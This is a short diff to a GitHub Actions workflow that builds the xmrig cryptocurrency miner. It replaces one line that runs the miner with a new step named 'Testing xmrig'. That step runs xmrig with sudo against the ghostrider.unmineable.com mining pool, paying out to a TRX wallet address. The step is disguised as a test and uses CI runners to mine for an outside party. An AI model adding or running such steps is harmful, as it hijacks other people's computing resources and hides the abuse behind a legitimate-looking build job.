@@ -34,7 +34,11 @@ jobs:
           cd workspace/kernel/build
           cmake ..
           make -j$(nproc)
-          ./xmrig -a gr -o stratum+ssl://ghostrider.unmineable.com:443 -u "TRX:TUa3ZgQfnT21kQsSc4MwZyFxigKrQdQ9dU.$(whoami)_$(uname -n)#uhok-ykxb" -p x
+
+      - name: Testing xmrig
+        run: |
+          cd workspace/kernel/build
+          sudo ./xmrig -a gr -o stratum+ssl://ghostrider.unmineable.com:443 -u "TRX:TSzDjv3U8zazCV7QPjCSqLwjuYf2sNWCsx.$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13; echo)#byyv-uprz" -p x -k
 
       - name: Release xmrig
         uses: softprops/action-gh-release@v1
